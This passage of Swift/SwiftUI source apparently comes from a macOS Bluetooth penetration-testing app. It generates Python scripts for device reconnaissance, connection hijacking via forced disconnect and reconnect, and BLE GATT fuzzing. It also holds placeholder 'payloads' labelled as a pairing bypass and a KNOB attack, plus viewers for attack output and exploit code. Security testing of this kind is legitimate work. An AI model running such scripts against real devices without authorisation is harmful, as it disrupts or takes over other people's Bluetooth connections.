    private func generateReconExploit(device: MacOSBluetoothDevice) -> String {
        return """
        #!/usr/bin/env python3
        # Bluetooth Device Reconnaissance
        
        import subprocess
        import json
        
        def bluetooth_recon():
            target = "\(device.address)"
            recon_data = {}
            
            # Device information
            recon_data["target"] = target
            recon_data["device_name"] = "\(device.name ?? "Unknown")"
            recon_data["rssi"] = \(device.rssi)
            
            # HCI device info
            try:
                cmd = ["hcitool", "info", target]
                result = subprocess.check_output(cmd)
                recon_data["hci_info"] = result.decode()
            except:
                pass
            
            # Clock offset
            try:
                cmd = ["hcitool", "clock", target]
                result = subprocess.check_output(cmd)
                recon_data["clock_offset"] = result.decode()
            except:
                pass
            
            # Manufacturer data
            recon_data["manufacturer"] = "\(device.manufacturerName ?? "Unknown")"
            
            return json.dumps(recon_data, indent=2)
        
        if __name__ == "__main__":
            print(bluetooth_recon())
        """
    }
    
    private func generateConnectionHijackExploit(device: MacOSBluetoothDevice) -> String {
        return """
        #!/usr/bin/env python3
        # Bluetooth Connection Hijacking
        
        import subprocess
        import time
        
        def hijack_connection():
            target = "\(device.address)"
            
            # Step 1: Monitor active connections
            print(f"Monitoring connections to {target}")
            
            # Step 2: Attempt connection takeover
            try:
                # Force disconnect existing connections
                cmd = ["hcitool", "dc", target]
                subprocess.run(cmd)
                
                time.sleep(1)
                
                # Establish our own connection
                cmd = ["hcitool", "cc", target]
                result = subprocess.run(cmd)
                
                if result.returncode == 0:
                    print("Connection hijack successful")
                    return True
                else:
                    print("Connection hijack failed")
                    return False
                    
            except Exception as e:
                print(f"Hijack error: {e}")
                return False
        
        if __name__ == "__main__":
            hijack_connection()
        """
    }
    
    private func generateBLEFuzzExploit(device: MacOSBluetoothDevice) -> String {
        return """
        #!/usr/bin/env python3
        # BLE Protocol Fuzzing
        
        import asyncio
        from bleak import BleakClient
        import random
        
        async def fuzz_ble_services():
            target = "\(device.address)"
            
            async with BleakClient(target) as client:
                services = await client.get_services()
                
                for service in services:
                    print(f"Fuzzing service: {service.uuid}")
                    
                    for char in service.characteristics:
                        if "write" in char.properties:
                            # Generate fuzz data
                            fuzz_data = bytes([random.randint(0, 255) for _ in range(20)])
                            
                            try:
                                await client.write_gatt_char(char.uuid, fuzz_data)
                                print(f"  Sent fuzz to {char.uuid}")
                            except Exception as e:
                                print(f"  Error fuzzing {char.uuid}: {e}")
        
        if __name__ == "__main__":
            asyncio.run(fuzz_ble_services())
        """
    }
    
    // MARK: - Payload Generators
    
    private func generateBLEAuthPayload(device: MacOSBluetoothDevice) -> String {
        return "0x06,0x00,0x01,0x02,0x03,0x04  # BLE pairing bypass payload"
    }
    
    private func generateKNOBPayload(device: MacOSBluetoothDevice) -> String {
        return "0x01,0x17,0x01  # Force 1-byte key entropy"
    }
    
    private func generateInfoExtractionPayload(device: MacOSBluetoothDevice) -> String {
        return "SDP_SERVICE_SEARCH_REQUEST  # Service discovery payload"
    }
    
    private func generateReconPayload(device: MacOSBluetoothDevice) -> String {
        return "HCI_READ_REMOTE_NAME_REQUEST  # Device information request"
    }
    
    private func generateConnectionHijackPayload(device: MacOSBluetoothDevice) -> String {
        return "HCI_DISCONNECT + HCI_CREATE_CONNECTION  # Connection takeover"
    }
    
    private func generateBLEFuzzPayload(device: MacOSBluetoothDevice) -> String {
        return "RANDOM_GATT_WRITE_DATA  # BLE protocol fuzzing payload"
    }
    
    // MARK: - Connection Testing
    
    private func testDeviceConnection(_ device: MacOSBluetoothDevice) async {
        isTestingConnection = true
        connectionTestResult = nil
        
        do {
            let result = await bluetoothFramework.testDeviceConnection(device)
            connectionTestResult = result
            
            if result.success {
                connectionStatusMessage = "✅ Connection test successful!\n\nDevice '\(device.name ?? "Unknown")' is reachable and responsive.\n\nPerforming security analysis..."
                
                // Trigger additional security analysis after successful connection
                await performDetailedSecurityAnalysis(device)
            } else {
                connectionStatusMessage = "❌ Connection test failed\n\nDevice '\(device.name ?? "Unknown")' is not reachable.\n\nError: \(result.error ?? "Unknown error")"
            }
            
            showingConnectionAlert = true
        } catch {
            connectionStatusMessage = "⚠️ Connection test error\n\nAn unexpected error occurred: \(error.localizedDescription)"
            showingConnectionAlert = true
        }
        
        isTestingConnection = false
    }
    
    private func performDetailedSecurityAnalysis(_ device: MacOSBluetoothDevice) async {
        // Trigger comprehensive security analysis
        await bluetoothFramework.performAdvancedSecurityAnalysis(device)
        
        // Force UI update to show new vulnerabilities
        DispatchQueue.main.async {
            self.selectedDevice = device
        }
    }
    
    // MARK: - Helper Functions
    
    private func deviceIcon(for deviceClass: BluetoothDeviceClass) -> String {
        switch deviceClass {
        case .phone: return "iphone"
        case .computer: return "laptopcomputer"
        case .audio: return "headphones"
        case .keyboard: return "keyboard"
        case .mouse: return "computermouse"
        case .wearable: return "applewatch"
        case .automotive: return "car"
        case .medical: return "cross.case"
        case .iot: return "homekit"
        case .industrial: return "gear"
        default: return "questionmark.circle"
        }
    }
    
    private func deviceColor(for deviceClass: BluetoothDeviceClass) -> Color {
        switch deviceClass {
        case .phone: return .blue
        case .computer: return .purple
        case .audio: return .green
        case .keyboard, .mouse: return .orange
        case .wearable: return .pink
        case .automotive: return .red
        case .medical: return .mint
        case .iot: return .cyan
        case .industrial: return .brown
        default: return .gray
        }
    }
    
    private func rssiColor(_ rssi: Int) -> Color {
        switch rssi {
        case -30...0: return .green
        case -50...(-31): return .yellow
        case -70...(-51): return .orange
        default: return .red
        }
    }
    
    private func severityIcon(_ severity: Vulnerability.Severity) -> String {
        switch severity {
        case .critical: return "exclamationmark.triangle.fill"
        case .high: return "exclamationmark.circle.fill"
        case .medium: return "exclamationmark.circle"
        case .low: return "info.circle"
        case .info: return "info.circle"
        }
    }
    
    private func severityColor(_ severity: Vulnerability.Severity) -> Color {
        switch severity {
        case .critical: return .red
        case .high: return .orange
        case .medium: return .yellow
        case .low: return .blue
        case .info: return .gray
        }
    }
}

// MARK: - Attack Vector Model

struct BluetoothAttackVector: Identifiable {
    let id = UUID()
    let name: String
    let description: String
    let icon: String
    let difficulty: AttackDifficulty
    let cveId: String?
    let severity: Vulnerability.Severity
    let exploitCode: String
    let payload: String
    
    enum AttackDifficulty: String, CaseIterable {
        case easy = "Easy"
        case medium = "Medium"
        case hard = "Hard"
        case expert = "Expert"
    }
    
    var severityColor: Color {
        switch severity {
        case .critical: return .red
        case .high: return .orange
        case .medium: return .yellow
        case .low: return .blue
        case .info: return .gray
        }
    }
}

// MARK: - Attack Execution Result Model

struct AttackExecutionResult: Identifiable {
    let id = UUID()
    let attackName: String
    let targetDevice: String
    let targetName: String
    let startTime: Date
    var endTime: Date?
    var status: ExecutionStatus
    var output: [String]
    let exploitCode: String
    let payload: String
    
    enum ExecutionStatus {
        case running
        case completed
        case failed
        
        var icon: String {
            switch self {
            case .running: return "clock.fill"
            case .completed: return "checkmark.circle.fill"
            case .failed: return "xmark.circle.fill"
            }
        }
        
        var color: Color {
            switch self {
            case .running: return .blue
            case .completed: return .green
            case .failed: return .red
            }
        }
    }
    
    var duration: TimeInterval {
        guard let endTime = endTime else {
            return Date().timeIntervalSince(startTime)
        }
        return endTime.timeIntervalSince(startTime)
    }
}

// MARK: - Attack Results View

struct AttackResultsView: View {
    let result: AttackExecutionResult
    @Environment(\.dismiss) private var dismiss
    @State private var selectedTab: ResultTab = .output
    
    enum ResultTab: String, CaseIterable {
        case output = "Output"
        case exploit = "Exploit Code"
        case payload = "Payload"
        
        var icon: String {
            switch self {
            case .output: return "terminal"
            case .exploit: return "doc.text"
            case .payload: return "cube"
            }
        }
    }
    
    var body: some View {
        VStack(spacing: 0) {
            // Header
            VStack(alignment: .leading, spacing: 12) {
                HStack {
                    HStack(spacing: 12) {
                        Image(systemName: result.status.icon)
                            .foregroundColor(result.status.color)
                            .font(.title2)
                        
                        VStack(alignment: .leading, spacing: 4) {
                            Text(result.attackName)
                                .font(.headline)
                                .fontWeight(.semibold)
                            
                            Text("\(result.targetName) (\(result.targetDevice))")
                                .font(.subheadline)
                                .foregroundColor(.secondary)
                        }
                    }
                    
                    Spacer()
                    
                    VStack(alignment: .trailing, spacing: 4) {
                        Text("\(result.status)".capitalized)
                            .font(.caption)
                            .fontWeight(.medium)
                            .foregroundColor(result.status.color)
                            .padding(.horizontal, 8)
                            .padding(.vertical, 4)
                            .background(result.status.color.opacity(0.2))
                            .cornerRadius(6)
                        
                        Text(String(format: "%.1fs", result.duration))
                            .font(.caption2)
                            .foregroundColor(.secondary)
                    }
                }
                
                HStack {
                    Text("Started: \(result.startTime.formatted(date: .omitted, time: .standard))")
                        .font(.caption)
                        .foregroundColor(.secondary)
                    
                    Spacer()
                    
                    Button("Copy") {
                        let content = selectedTab == .output ? result.output.joined(separator: "\\n") :
                                     selectedTab == .exploit ? result.exploitCode : result.payload
                        NSPasteboard.general.setString(content, forType: .string)
                    }
                    .secondaryButton()
                    
                    Button("Done") {
                        dismiss()
                    }
                    .primaryButton()
                }
            }
            .padding()
            .background(Color.gray.opacity(0.1))
            
            // Tab Selection
            HStack(spacing: 0) {
                ForEach(ResultTab.allCases, id: \.self) { tab in
                    Button(action: { 
                        withAnimation(.easeInOut(duration: 0.2)) {
                            selectedTab = tab 
                        }
                    }) {
                        HStack(spacing: 6) {
                            Image(systemName: tab.icon)
                                .font(.caption)
                            Text(tab.rawValue)
                                .font(.caption)
                        }
                        .padding(.horizontal, 12)
                        .padding(.vertical, 8)
                        .frame(maxWidth: .infinity)
                        .background(selectedTab == tab ? Color.blue : Color.clear)
                        .foregroundColor(selectedTab == tab ? .white : .primary)
                    }
                    .buttonStyle(.plain)
                }
            }
            .background(Color.gray.opacity(0.05))
            
            Divider()
            
            // Content
            ScrollView {
                VStack(alignment: .leading, spacing: 0) {
                    switch selectedTab {
                    case .output:
                        if result.output.isEmpty {
                            VStack(spacing: 12) {
                                Image(systemName: "terminal")
                                    .font(.system(size: 32))
                                    .foregroundColor(.secondary)
                                Text("No output available")
                                    .font(.subheadline)
                                    .foregroundColor(.secondary)
                            }
                            .frame(maxWidth: .infinity)
                            .padding(.vertical, 40)
                        } else {
                            LazyVStack(alignment: .leading, spacing: 2) {
                                ForEach(Array(result.output.enumerated()), id: \.offset) { index, line in
                                    HStack(alignment: .top, spacing: 8) {
                                        Text("\(index + 1)")
                                            .font(.system(.caption2, design: .monospaced))
                                            .foregroundColor(.secondary)
                                            .frame(width: 30, alignment: .trailing)
                                        
                                        Text(line)
                                            .font(.system(.caption, design: .monospaced))
                                            .textSelection(.enabled)
                                            .frame(maxWidth: .infinity, alignment: .leading)
                                        
                                        Spacer()
                                    }
                                    .padding(.horizontal, 12)
                                    .padding(.vertical, 2)
                                    .background(index % 2 == 0 ? Color.clear : Color.gray.opacity(0.05))
                                }
                            }
                        }
                        
                    case .exploit:
                        if result.exploitCode.isEmpty {
                            VStack(spacing: 12) {
                                Image(systemName: "doc.text")
                                    .font(.system(size: 32))
                                    .foregroundColor(.secondary)
                                Text("No exploit code available")
                                    .font(.subheadline)
                                    .foregroundColor(.secondary)
                            }
                            .frame(maxWidth: .infinity)
                            .padding(.vertical, 40)
                        } else {
                            Text(result.exploitCode)
                                .font(.system(.caption, design: .monospaced))
                                .textSelection(.enabled)
                                .padding(16)
                                .frame(maxWidth: .infinity, alignment: .leading)
                                .background(Color.black.opacity(0.05))
                                .cornerRadius(8)
                                .padding(.horizontal, 12)
                                .padding(.vertical, 8)
                        }
                        
                    case .payload:
                        if result.payload.isEmpty {
                            VStack(spacing: 12) {
                                Image(systemName: "cube")
                                    .font(.system(size: 32))
                                    .foregroundColor(.secondary)
                                Text("No payload available")
                                    .font(.subheadline)
                                    .foregroundColor(.secondary)
                            }
                            .frame(maxWidth: .infinity)
                            .padding(.vertical, 40)
                        } else {
                            Text(result.payload)
                                .font(.system(.caption, design: .monospaced))
                                .textSelection(.enabled)
                                .padding(16)
                                .frame(maxWidth: .infinity, alignment: .leading)
                                .background(Color.black.opacity(0.05))
                                .cornerRadius(8)
                                .padding(.horizontal, 12)
                                .padding(.vertical, 8)
                        }
                    }
                }
            }
        }
        .frame(minWidth: 600, minHeight: 400)
    }
}

// MARK: - CVE Exploit Details

struct CVEExploitDetails {
    let cveId: String
    let exploitCode: String
    let description: String
    let severity: LiveCVEEntry.CVESeverity
}

struct CVEExploitCodeView: View {
    let exploit: CVEExploitDetails
    @Environment(\.dismiss) private var dismiss
    @State private var selectedTab: ExploitTab = .code
    
    enum ExploitTab: String, CaseIterable {
        case code = "Exploit Code"
        case description = "Description"
        case references = "References"
        
        var icon: String {
            switch self {
            case .code: return "doc.text"
            case .description: return "info.circle"
            case .references: return "link"
            }
        }
    }
    
    var body: some View {
        VStack(spacing: 0) {
            // Header
            VStack(alignment: .leading, spacing: 12) {
                HStack {
                    HStack(spacing: 12) {
                        Image(systemName: "shield.slash")
                            .foregroundColor(exploit.severity.color)
                            .font(.title2)
                        
                        VStack(alignment: .leading, spacing: 4) {
                            Text(exploit.cveId)
                                .font(.headline)
                                .fontWeight(.semibold)
                            
                            Text("Exploit Code Viewer")
                                .font(.subheadline)
                                .foregroundColor(.secondary)
                        }
                    }
                    
                    Spacer()
                    
                    VStack(alignment: .trailing, spacing: 4) {
                        Text(exploit.severity.rawValue)
                            .font(.caption)
                            .fontWeight(.medium)
                            .foregroundColor(exploit.severity.color)
                            .padding(.horizontal, 8)
                            .padding(.vertical, 4)
                            .background(exploit.severity.color.opacity(0.2))
                            .cornerRadius(6)
                    }
                }
                
                HStack {
                    Text("CVE Exploit Analysis")
                        .font(.caption)
                        .foregroundColor(.secondary)
                    
                    Spacer()
                    
                    Button("Copy Code") {
                        NSPasteboard.general.setString(exploit.exploitCode, forType: .string)
                    }
                    .secondaryButton()
                    
                    Button("Done") {
                        dismiss()
                    }
                    .primaryButton()
                }
            }
            .padding()
            .background(Color.gray.opacity(0.1))
            
            // Tab Selection
            HStack(spacing: 0) {
                ForEach(ExploitTab.allCases, id: \.self) { tab in
                    Button(action: { 
                        withAnimation(.easeInOut(duration: 0.2)) {
                            selectedTab = tab 
                        }
                    }) {
                        HStack(spacing: 6) {
                            Image(systemName: tab.icon)
                                .font(.caption)
                            Text(tab.rawValue)
                                .font(.caption)
                        }
                        .padding(.horizontal, 12)
                        .padding(.vertical, 8)
                        .frame(maxWidth: .infinity)
                        .background(selectedTab == tab ? Color.red : Color.clear)
                        .foregroundColor(selectedTab == tab ? .white : .primary)
                    }
                    .buttonStyle(.plain)
                }
            }
            .background(Color.gray.opacity(0.05))
            
            Divider()
            
            // Content
            ScrollView {
                VStack(alignment: .leading, spacing: 0) {
                    switch selectedTab {
                    case .code:
                        if exploit.exploitCode.isEmpty {
                            VStack(spacing: 12) {
                                Image(systemName: "doc.text")
                                    .font(.system(size: 32))
                                    .foregroundColor(.secondary)
                                Text("No exploit code available")
                                    .font(.subheadline)
                                    .foregroundColor(.secondary)
                            }
                            .frame(maxWidth: .infinity)
                            .padding(.vertical, 40)
                        } else {
                            VStack(alignment: .leading, spacing: 12) {
                                // Warning banner
                                HStack(spacing: 8) {
                                    Image(systemName: "exclamationmark.triangle.fill")
                                        .foregroundColor(.orange)
                                    Text("WARNING: Use only for authorized penetration testing")
                                        .font(.caption)
                                        .fontWeight(.medium)
                                }
                                .padding()
                                .background(Color.orange.opacity(0.1))
                                .cornerRadius(8)
                                .padding(.horizontal, 12)
                                .padding(.top, 8)
                                
                                // Exploit code
                                Text(exploit.exploitCode)
                                    .font(.system(.caption, design: .monospaced))
                                    .textSelection(.enabled)
                                    .padding(16)
                                    .frame(maxWidth: .infinity, alignment: .leading)
                                    .background(Color.black.opacity(0.05))
                                    .cornerRadius(8)
                                    .padding(.horizontal, 12)
                            }
                        }
                        
                    case .description:
                        VStack(alignment: .leading, spacing: 16) {
                            Text("CVE Description")
                                .font(.headline)
                                .fontWeight(.semibold)
                                .padding(.horizontal, 12)
                                .padding(.top, 16)
                            
                            Text(exploit.description)
                                .font(.body)
                                .textSelection(.enabled)
                                .padding(.horizontal, 16)
                                .padding(.bottom, 16)
                        }
                        
                    case .references:
                        VStack(alignment: .leading, spacing: 16) {
                            Text("References & Resources")
                                .font(.headline)
                                .fontWeight(.semibold)
                                .padding(.horizontal, 12)
                                .padding(.top, 16)
                            
                            VStack(alignment: .leading, spacing: 8) {
                                Link("NIST NVD Entry", destination: URL(string: "https://nvd.nist.gov/vuln/detail/\(exploit.cveId)")!)
                                    .foregroundColor(.blue)
                                    .padding(.horizontal, 16)
                                
                                Link("CVE MITRE Entry", destination: URL(string: "https://cve.mitre.org/cgi-bin/cvename.cgi?name=\(exploit.cveId)")!)
                                    .foregroundColor(.blue)
                                    .padding(.horizontal, 16)
                                
                                Text("Additional exploit information may be available through security research databases and responsible disclosure programs.")
                                    .font(.caption)
                                    .foregroundColor(.secondary)
                                    .padding(.horizontal, 16)
                            }
                            .padding(.bottom, 16)
                        }
                    }
                }
            }
        }
        .frame(minWidth: 600, minHeight: 400)
    }
}

#Preview {
    MacOSBluetoothSecurityView()
        .environment(AppState())
}